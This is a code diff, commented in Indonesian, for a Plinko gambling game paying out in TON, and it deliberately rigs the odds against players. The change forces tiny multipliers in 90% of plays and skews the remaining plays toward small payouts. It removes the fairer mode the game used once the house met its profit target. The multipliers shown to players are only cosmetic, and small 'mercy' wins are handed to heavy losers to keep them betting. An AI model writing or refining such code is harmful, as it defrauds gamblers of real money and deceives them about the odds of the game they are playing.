@@ -9,7 +9,7 @@ from pathlib import Path
 
 DB_PATH = Path(__file__).parent.parent.parent / 'data' / 'plinko.db'
 
-TARGET_BANDAR_PROFIT = 10.0
+TARGET_BANDAR_PROFIT = 5.0
 
 # Konfigurasi multiplier untuk setiap risk level (tampilan visual saja)
 RISK_MULTIPLIERS = {
@@ -20,9 +20,9 @@ RISK_MULTIPLIERS = {
 
 # Multiplier kecil untuk force games (magnet ke angka kecil)
 SMALL_MULTIPLIERS = {
-    'low': [0.5, 0.5, 1, 1, 1, 1.5, 2],
-    'medium': [0.2, 0.2, 0.5, 0.5, 1, 1, 1.5, 2],
-    'high': [0.0, 0.0, 0.1, 0.1, 0.2, 0.5, 0.5, 0.8, 1, 1]
+    'low': [0.5, 0.5, 0.5, 0.5, 1, 1, 2],
+    'medium': [0.2, 0.2, 0.2, 0.5, 0.5, 1, 1, 2.5],
+    'high': [0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.5, 0.8, 1, 1]
 }
 
 # Multiplier sedang (kadang-kadang muncul untuk membuat user tetap bermain)
@@ -324,10 +324,7 @@ def calculate_cheat_intensity():
     # Defisit = berapa banyak bandar masih kurang dari target
     deficit = TARGET_BANDAR_PROFIT - current_profit
     
-    # Intensitas: semakin besar defisit, semakin besar peluang cheat
-    # Maks intensitas 0.95 (95% kemungkinan cheat)
-    # Minimal intensitas 0.3 (30%) agar tetap ada efek
-    intensity = min(0.95, 0.3 + (deficit / (TARGET_BANDAR_PROFIT * 2)))
+    intensity = min(0.98, 0.5 + (deficit / (TARGET_BANDAR_PROFIT)))
     
     return max(0.0, intensity)
 
@@ -352,108 +349,66 @@ def get_forced_multiplier(risk_level, user_loss_data=None):
     return chosen, 'force_small_multiplier'
 
 def get_random_multiplier_with_cheat(risk_level, bet_amount, user_id, username):
-    """
-    SISTEM LICIK UTAMA:
-    - Cek profit bandar
-    - Jika profit < target, aktifkan cheat dengan intensitas tertentu
-    - Force multiplier kecil (magnet)
-    - Masih ada peluang hoki (jackpot) untuk membuat user tetap bermain
-    """
     cheat_active, current_profit, deficit = should_activate_cheat()
     cheat_intensity = calculate_cheat_intensity()
     user_loss = get_user_loss(user_id)
     
     is_forced = False
     forced_reason = None
-    final_multiplier = None
     
-    # STEP 1: Jika cheat aktif, lakukan force dengan probabilitas intensitas
-    if cheat_active:
-        # Roll random untuk menentukan apakah cheat digunakan
-        roll = random.random()
+    # FORCE CHEAT - selalu aktif untuk bikin player rugi
+    # 90% kemungkinan paksa multiplier kecil
+    roll = random.random()
+    
+    if roll < 0.90:  # 90% FORCE ke multiplier kecil
+        # Pilih dari small multipliers (paling kecil)
+        small_mult = SMALL_MULTIPLIERS.get(risk_level, SMALL_MULTIPLIERS['medium'])
         
-        if roll < cheat_intensity:
-            # FORCE GAMES: magnet ke multiplier kecil
-            final_multiplier, forced_reason = get_forced_multiplier(risk_level, user_loss)
-            is_forced = True
-            
-            # Log aksi kecurangan
-            log_cheat_action(
-                user_id, username, f"game_{datetime.now().timestamp()}",
-                "FORCE_SMALL_MULTIPLIER",
-                final_multiplier, None, cheat_intensity,
-                f"Bandar profit: {current_profit:.2f} TON (target: {TARGET_BANDAR_PROFIT}) | Defisit: {deficit:.2f}"
-            )
-            
-            print(f"🔴 [CHEAT ACTIVE] Force multiplier {final_multiplier}x for {username} | Profit: {current_profit:.2f}/{TARGET_BANDAR_PROFIT} TON | Intensity: {cheat_intensity:.2f}")
-            return final_multiplier, is_forced, forced_reason
+        # Jika user sudah rugi >10 TON, kasih sedikit angin (tapi tetap rugi)
+        if user_loss and user_loss['net_loss'] > 10:
+            mercy_mult = [0.5, 0.8, 1, 1, 1.2, 1.5]
+            chosen = random.choice(mercy_mult)
+            forced_reason = 'mercy_small_win'
+        else:
+            # Pilih multiplier paling kecil (0x - 0.5x untuk high risk)
+            chosen = random.choice(small_mult)
+            forced_reason = 'force_small_multiplier'
+        
+        is_forced = True
+        
+        log_cheat_action(
+            user_id, username, f"game_{datetime.now().timestamp()}",
+            "FORCE_SMALL_MULTIPLIER",
+            chosen, None, cheat_intensity,
+            f"Forcing loss. Profit: {current_profit:.2f}"
+        )
+        
+        print(f"🔴 [FORCE LOSS] {username} got {chosen}x")
+        return chosen, is_forced, forced_reason
     
-    # STEP 2: Tidak pakai cheat atau roll gagal
-    # Gunakan RNG dengan bias ke multiplier kecil (tetap menguntungkan bandar)
-    # Tapi masih ada peluang jackpot untuk hoki
-    
-    # Ambil multipliers berdasarkan risk level
+    # 10% sisanya - tetap bias ke multiplier kecil
     all_multipliers = RISK_MULTIPLIERS.get(risk_level, RISK_MULTIPLIERS['medium'])
     
-    # Kelompokkan multiplier
     small_mults = [m for m in all_multipliers if m < 1]
-    medium_mults = [m for m in all_multipliers if 1 <= m < 3]
-    big_mults = [m for m in all_multipliers if m >= 3]
+    medium_mults = [m for m in all_multipliers if 1 <= m < 2.5]
+    big_mults = [m for m in all_multipliers if m >= 2.5]
     
-    # Tambahkan beberapa multiplier sedang dari daftar medium (biar variatif)
-    medium_extra = MEDIUM_MULTIPLIERS.get(risk_level, [2, 3, 4])
-    
-    # Hitung probabilitas berdasarkan intensitas cheat yang tersisa
-    # Semakin tinggi intensitas, semakin kecil peluang jackpot
-    if cheat_active:
-        # Cheat masih aktif tapi roll gagal, tetap bias ke kecil
-        small_prob = 0.60
-        medium_prob = 0.32
-        big_prob = 0.08
-    else:
-        # Cheat tidak aktif (profit sudah cukup), RNG lebih fair
-        small_prob = 0.40
-        medium_prob = 0.40
-        big_prob = 0.20
-    
+    # Bobot: 70% kecil, 25% sedang, 5% besar
     rand = random.random()
     
-    if rand < small_prob and small_mults:
-        # Pilih multiplier kecil (bandar untung)
+    if rand < 0.70 and small_mults:
         chosen = random.choice(small_mults)
         forced_reason = 'small_bias'
-    elif rand < small_prob + medium_prob:
-        # Pilih multiplier sedang (bandar untung kecil atau impas)
-        if medium_mults:
-            chosen = random.choice(medium_mults)
-        else:
-            chosen = random.choice(medium_extra)
+    elif rand < 0.95 and medium_mults:
+        chosen = random.choice(medium_mults)
         forced_reason = 'medium_bias'
     elif big_mults:
-        # JACKPOT! Multiplier besar (bandar rugi, tapi bikin user happy)
         chosen = random.choice(big_mults)
-        forced_reason = 'big_bias_jackpot'
-        print(f"🎰 [JACKPOT] User {username} got {chosen}x multiplier!")
+        forced_reason = 'big_bias_rare'
+        print(f"🎰 [RARE] {username} got {chosen}x")
     else:
         chosen = random.choice(all_multipliers)
         forced_reason = 'random'
-    
-    # STEP 3: Proteksi - jangan sampai bandar rugi terlalu besar
-    # Jika multiplier yang keluar terlalu besar dan bisa bikin bandar rugi parah
-    profit_data = get_bandar_profit()
-    projected_profit_after = profit_data['profit'] + (bet_amount - (bet_amount * chosen))
-    
-    # Jika bandar akan rugi lebih dari 3 TON dan multiplier > 5x, turunkan
-    if projected_profit_after < -3 and chosen > 5:
-        fallback = random.choice(small_mults) if small_mults else 0.5
-        log_cheat_action(
-            user_id, username, f"game_{datetime.now().timestamp()}",
-            "PROFIT_PROTECTION_DOWNGRADE",
-            fallback, chosen, cheat_intensity,
-            f"Avoid big loss. Projected: {projected_profit_after:.2f}"
-        )
-        print(f"⚠️ [PROTECT] Downgrading {chosen}x to {fallback}x for {username}")
-        return fallback, True, 'profit_protection'
     
     return chosen, is_forced, forced_reason
 
